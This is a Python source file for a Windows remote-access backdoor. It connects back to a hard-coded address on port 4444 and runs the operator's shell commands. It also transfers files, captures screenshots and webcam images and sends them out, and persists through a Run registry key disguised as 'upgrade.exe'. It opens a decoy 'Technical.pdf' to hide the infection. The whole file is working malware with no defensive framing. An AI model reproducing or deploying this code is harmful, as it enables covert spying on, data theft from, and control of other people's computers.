import socket
import subprocess
import os
import base64
import simplejson
import sys
import shutil
import autopy
import time
import cv2
from pynput.keyboard import Listener


class MyBackdoor:
    def __init__(self, ip, port):
        while True:
            try:
                self.my_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.my_connection.connect((ip, port))
                break
            except Exception:
                time.sleep(1)
                pass
    def command_execution(self, command):
        return subprocess.check_output(command, shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)

    def json_send(self, data):
        json_data = simplejson.dumps(data)
        self.my_connection.send(json_data.encode("utf-8"))

    def json_recieve(self):
        json_data = ""
        while True:
            try:
                json_data += self.my_connection.recv(1048576).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def execute_cd_command(self, directory):
        os.chdir(directory)
        return "cd to " + directory

    def get_file_content(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

   
        
        
        
        

    def save_file(self, path, contents):
        with open(path, "wb") as file:
            file.write(base64.b64decode(contents))
            return "Upload Completed !!"

    def screen_capture(self):
        paths = os.environ["appdata"] + "\\screenshot.png"
        autopy.bitmap.capture_screen().save(paths)
        return paths
    
    def screen_capture_loop(self,sleep,n):
        i=0
        while(i<n):
            directory = os.environ["appdata"] + "\\screenshot"+str(i)+".png"
            autopy.bitmap.capture_screen().save(directory)
            self.json_send(self.get_file_content(directory))
            os.remove(directory)
            time.sleep(sleep)
            i+=1
        return "Screenshots Saved !!"
    def webcam_snap(self,sleep,t):
        videoCaptureObject=cv2.VideoCapture(0)
        i=0
        while(i<t):
            time.sleep(sleep)
            ret,frame = videoCaptureObject.read()
            directory = os.environ["appdata"] + "\\snap"+str(i)+".jpg"
            cv2.imwrite(directory, frame)
            self.json_send(self.get_file_content(directory))
            os.remove(directory)
            i+=1
        videoCaptureObject.release()
        cv2.destroyAllWindows()
        return "Snapshots Saved"
        

    def add_to_registry(self):
        new_file = os.environ["appdata"] + "\\upgrade.exe"
        if not os.path.exists(new_file):
            shutil.copyfile(sys.executable, new_file)
            regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new_file
            output=subprocess.check_output(regedit_command, shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
            return output
        else:
            return "Already Exist"
    def open_added_file(self):
        try:
            added_file = sys._MEIPASS + "\\Technical.pdf"
        except Exception:
            added_file = os.path.abspath(".") + "\\Technical.pdf"

        subprocess.Popen(added_file, shell=True)
    def start_socket(self):
        self.open_added_file()
        self.json_recieve()
        self.json_send("")
        while True:
            command = self.json_recieve()
            try:
                if command[0] == "quit":
                    self.my_connection.close()
                    exit(0)

                elif command[0] == "persistence":
                    command_output = self.add_to_registry()
                    
                elif command[0] == "download":
                    command_output = self.get_file_content(command[1])


                elif command[0] == "upload":
                    command_output = self.save_file(command[1],command[2])

                elif command[0] == "cd" and len(command) > 1:
                    command_output = self.execute_cd_command(command[1])

                elif command[0] == "screenshot" and len(command)==1:
                    captures = self.screen_capture()
                    command_output = self.get_file_content(captures)
                

                elif command[0] == "screenshot" and len(command)>1:
                    command_output=self.screen_capture_loop(int(command[1]), int(command[2]))

                elif command[0] == "webcam_snap":
                    command_output = self.webcam_snap(int(command[1]),int(command[2]))

                else:
                    command_output = self.command_execution(command)
            except Exception:
                command_output = "Error !!"
            self.json_send(command_output)
        self.my_connection.close()


my_backdoor = MyBackdoor("10.0.2.5",4444)
my_backdoor.start_socket()
